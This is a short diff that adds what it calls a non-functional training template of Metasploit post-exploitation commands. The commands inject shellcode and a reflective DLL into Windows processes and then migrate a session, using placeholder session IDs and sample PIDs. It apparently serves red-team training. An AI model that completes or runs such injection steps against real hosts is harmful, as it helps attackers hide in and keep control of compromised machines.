@@ -1,0 +1,19 @@
+# Process Injection Template
+# For Training Use – Non-functional Template
+
+use post/windows/manage/inject_host
+set SESSION <SESSION_ID>
+set PID 1234
+set DATASTORE_FILE /tmp/shellcode.bin
+run
+
+use post/windows/manage/reflective_dll_inject
+set SESSION <SESSION_ID>
+set PID 5678
+set PATH /tmp/inject.dll
+run
+
+use post/windows/manage/migrate
+set SESSION <SESSION_ID>
+set PID 9012
+run
